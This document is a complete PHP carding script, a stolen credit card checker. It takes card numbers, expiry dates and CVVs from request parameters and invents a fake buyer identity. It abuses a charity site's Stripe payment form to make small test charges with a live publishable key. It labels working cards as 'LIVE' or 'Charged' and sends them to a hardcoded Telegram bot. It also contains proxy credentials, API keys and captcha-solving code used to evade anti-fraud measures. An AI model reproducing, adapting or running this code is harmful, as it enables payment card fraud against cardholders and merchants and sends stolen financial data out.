<?php
include(__DIR__."/Phppot/proxy.php");
error_reporting(0);
$time_start = microtime(true);
set_time_limit(200);
function GetStr($string, $start, $end){
    if ($string == ""){
        return false;

    }
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
$cookie = randomString();
function RandomString($length = 16)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function cURLc($url, $headers, $postfields, $customrequest) {

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        // CURLOPT_SSL_VERIFYPEER => 1,
        // CURLOPT_SSL_VERIFYHOST => 1,
        // CURLOPT_COOKIE => "itrack=$cookie",
        CURLOPT_HEADER => 1,
        CURLOPT_CUSTOMREQUEST => $customrequest,
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

function cURL($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => $_fls,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_COOKIE => "itrack=$cookie",
        CURLOPT_HEADER => 1,
        CURLOPT_CUSTOMREQUEST => $customrequest,
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}



function proxy() 
{ 
$file = file("proxy.txt");
  $a = rand(0, sizeof($file) - 1); 
  $siteSelected  = $file[$a]; 
  return $siteSelected; 
}
//  //$ips = proxy();
// //port = rand(111,999);
// $ips = getProxy("best", '173.82.245.245');
// $ips = json_decode($ips, true);
// $ips = $ips["proxy"];
// $ips = "173.82.245.245:5566";
// $prox = proxy();
function cURL_ProxyOn($url, $headers, $postfields, $customrequest, $_fls, $cookie) {
    // if($cproxy == 1){
//   $proxie = proxy();
//    } else {
//       $proxie = "http://scraperapi.render=true.device_type=desktop.remium=true.country=us:f73965b26e9d8457634c8b1597c0e6da@proxy-server.scraperapi.com:8001";
//     // }

    $cproxy = '{"proxy": "http://127.0.0.1:5555"}';
   //$cproxy = ''; 
    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => $_fls,
        // CURLOPT_RETURNTRANSFER => true,
        // CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_SSL_VERIFYPEER => False,
       // CURLOPT_URL => "https://app.zenscrape.com/api/v1/get?apikey=dd19f2e0-5052-11ed-86e6-791429dd32d4&url=$url&render=true&premium=true&device_type=mobile&keep_headers=true",
        // CURLOPT_PROXY => "http://173.82.245.245:5000/fetch_random",
        // CURLOPT_PROXYTYPE =>  'http',
        CURLOPT_PROXY=> $cproxy,
        CURLOPT_COOKIE => "itrack=$cookie",
        CURLOPT_CUSTOMREQUEST => $customrequest,
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}
function randomInfo(){

    $curl = curl_init();

    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://namegenerator.in/assets/refresh.php?location=united-states',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        // CURLOPT_PROXY => "isp2.hydraproxy.com:9989",
        // CURLOPT_PROXYUSERPWD => "grea31455cbwp89831:QLaSAJIh07Lx9Lss",
        CURLOPT_CUSTOMREQUEST => 'GET',
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return $response;
}
extract($_GET);
$separator = explode("|", $lista);
$cc = $separator[0];
$ccbin = substr($cc, 0,6);
$mm = $separator[1];
$yy = $separator[2];
$yy1 = substr($yy, 2,2);
$cvv = $separator[3];

$cbin = substr($cc, 0,1);
$rnum = rand(1111,9999);


if($cbin == 5){
    $ctype = 'MasterCard';
}
else if($cbin == 4){
    $ctype = 'visa';
}

function solveCaptcha($site,$siteKey,$clientKey){
    $createTask =  cURLc(
        "https://api.capmonster.cloud/createTask",
        $headers = [
            "Content-Type: application/json",
            "accept: application/json"
        ],
        '{"clientKey":"'.$clientKey.'","task":{"type":"NoCaptchaTaskProxyless","websiteURL":"'.$site.'","websiteKey":"'.$siteKey.'"}}',
        "POST"
    );
    $taskId = getstr(json_encode($createTask,true),'"taskId\":','}');
    $status = "processing";
    $gResponse = "";
    while ($status == "processing") {
        sleep(3);
        $getTaskResult =  cURLc(
            "https://api.capmonster.cloud/getTaskResult ",
            $headers = [
                "Content-Type: application/json",
                "accept: application/json"
            ],
            '{"clientKey":"'.$clientKey.'","taskId": '.$taskId.'}',
            "POST"
        );
        $status = getstr($getTaskResult,'"status":"','"');
        $gResponse = getstr($getTaskResult,'"gRecaptchaResponse":"','"');}
    return $getTaskResult ;
}
$port = rand(10000, 11000);
$ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => "https://binov.net/",
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_HEADER => 1,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/x-www-form-urlencoded",
        "Referer: https://binov.net/",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32"
    ],
    CURLOPT_POSTFIELDS => "BIN=$ccbin"
));
$g_ccdets = curl_exec($ch);
//$cc_bin = GetStr($g_ccdets, '</tr><tr><td>' , '</td>');
$cc_type0 = GetStr($g_ccdets, "$cc_bin</td><td>" , '</td>');
$cc_bname = GetStr($g_ccdets, "$cc_type0</td><td>" , '</td>');
$cc_type1 = GetStr($g_ccdets, "$cc_bname</td><td>" , '</td>');
$cc_type2 = GetStr($g_ccdets, "$cc_type1</td><td>" , '</td>');
$cc_country = GetStr($g_ccdets, "$cc_type2</td><td>" , '</td>');
// $CC_fDets = "BIN: $ccbin BIN Info: $type0-$type1-$type2 Bank: $cc_bname Country: $cc_country";
$CC_fDets = "Bank: $cc_bname Country: $cc_country";
$randomShits = randomInfo();
$data = json_decode($randomShits, true);
$fname = explode(" ", $data['name'])[0];
$lname = explode(" ", $data['name'])[1];
$email = $data['email']['address'];
$street = $data['street1'];
$local = GetStr($randomShits, '"street2":', ',"phone"');
$city = GetStr($local, '"', ',');
$state = GetStr($local, ', ', ' ');
$phone = str_replace("-", "", $data['phone']);
$postcode = GetStr($local, "$state" , '"');
#====================================
// $pkey = "pk_live_SrENf9teZoAo9KSrWJh6Qe48";
// $tokens = "f1e38aeafbeabc0de447ca0af89b0627";
// $prod_id = "117";
// $amnt = 1;
// $curr = "USD";
// $ua = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36";
// $referrer = "https://www.resoluteacademy.com/?asp_action=show_pp&product_id=117";
// $site  = "https://www.resoluteacademy.com/wp-admin/admin-ajax.php";
#============================================
//
//$trans_completed = false;
//$tries = 0;
//$limit = 3;
//$randomnum = rand(200000,300000);
//while ($trans_completed == false && $tries < $limit) {
$tries = $tries + 1;
$cookie = RandomString();
$str = substr(randomString(), 0, 7);

 echo $get_id =  cURL(
    "https://worlddidac.org/asp-payment-box/?product_id=13309",
    $headers = [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
    ],
    "",
    "GET",
    1,
    $cookie
);
 $stripebutton = GetStr($get_id, "name='stripeButtonKey' value='", "'");
echo $confirm = GetStr($get_id, '"asp_pp_ajax_nonce":"', '"');
echo $create_pi = GetStr($get_id, '"asp_pp_ajax_create_pi_nonce":"', '"');

  $ajax1 =  cURL(
    "https://worlddidac.org/wp-admin/admin-ajax.php",
    $headers = [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        'Accept: */*',
        'Content-Type: application/x-www-form-urlencoded',
        'Referer: https://worlddidac.org/asp-payment-box/?product_id=13309'
    ],
    'action=asp_pp_create_pi&nonce='.$create_pi.'&amount=100&curr=USD&product_id=13309&quantity=1&billing_details={"name":"'.$str.'%20gonzales","email":"'.$str.'.'.$create_pi.'%40gmail.com","address":{"line1":"'.$str.'","city":"'.$create_pi.'","state":"'.$create_pi.'","country":"US","postal_code":"90001"}}&token=a335df0e86814ae6ea6d68db2b45e82c',
    "POST",
    1,
    $cookie
);
$pi_id = GetStr($ajax1, '"pi_id":"', '"');
$secret = GetStr($ajax1, '"clientSecret":"', '"');


 $get_token =  cURL(    
    "https://api.stripe.com/v1/tokens",
    $headers = [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        'Accept: application/json',
        'Content-Type: application/x-www-form-urlencoded',
        'Referer: https://js.stripe.com/'
    ],
    "card[name]=$str+$str&card[address_line1]=$str&card[address_city]=$str&card[address_state]=$str&card[address_zip]=90001&card[address_country]=US&card[number]=$cc&card[cvc]=&card[exp_month]=$mm&card[exp_year]=$yy1&key=pk_live_WnXVdTel3myF4OP4YiPnTuMn&_stripe_version=2020-03-02",
    "POST",
    1,
    $cookie
);
// $page = $page;
// $data = json_decode($page);
// $SECRET = $data['clientSecret'];
// $pi = $data['pi_id'];
// $confirm = GetStr($page, '"asp_pp_ajax_nonce":"', '"');
//  $SECRET = GetStr($page, '"clientSecret":"', '"');
 $token = GetStr($get_token, '"id": "', '"');
  $ips = GetStr($get_token, '"client_ip": "', '"');



 echo $execute =  cURL(
       "https://worlddidac.org/wp-admin/admin-ajax.php",
       $headers = [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        'Accept: */*',
        'Content-Type: application/x-www-form-urlencoded',
        'Referer: https://worlddidac.org/asp-payment-box/?product_id=13309'
       ],
       'action=asp_pp_confirm_pi&nonce='.$confirm.'&product_id=13309&pi_id='.$pi_id.'&token=a335df0e86814ae6ea6d68db2b45e82c&opts={"save_payment_method":true,"setup_future_usage":"off_session","receipt_email":"'.$str.'.mendez1990%40gmail.com","payment_method_data":{"type":"card","card":{"token":"'.$token.'"}}}',
       "POST",
       1,
       $cookie
   );

    // $ips = GetStr($token_method, '"client_ip": "', '"');
    $response = GetStr($execute, '"err":"Stripe API error occurred: ','.');
    // $response = strip_tags($execute);
$response = html_entity_decode($response);
    // $code = GetStr($execute, '"code": "','"');
   // $dcode = GetStr($execute, '"code": "','"');
    // $tds = GetStr($execute, '"type": "','"');



if (strpos($execute, 'Thank you') ){
    echo '<tr><td><span class="badge bg-success">LIVE CCN</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged['.$amnt.'.00]$</span> <span class="badge bg-light text-dark">'.$CC_fDets.'</span></td></tr><br>';
    echo '<tr><td><span class="badge bg-success">LIVE CCN</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged['.$amnt.'.00]$</span> <span class="badge bg-light text-dark">'.$CC_fDets.'</span></td></tr><br>';
   file_get_contents('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text='.$lista.' CHARGED CCN - STRPE GATE');
}elseif (strpos($execute, 'security code is incorrect')){
    echo '<tr><td><span class="badge bg-success">LIVE CCN</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged['.$amnt.'.00]$</span> <span class="badge bg-light text-dark">'.$CC_fDets.'</span></td></tr><br>';
   file_get_contents('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text='.$lista.' AUTHORISE CCN - STRPE GATE');
}elseif(strpos($execute, 'Your card was declined')){
    echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill"> "MESSAGE": "'.$response.'" - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> INFO: '.$ips.' Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
}else {
    echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">"MESSAGE": UNEXPECTED ERROR - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> INFO: '.$ips.' Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
}


unlink("cookies/$cookie.txt");

?>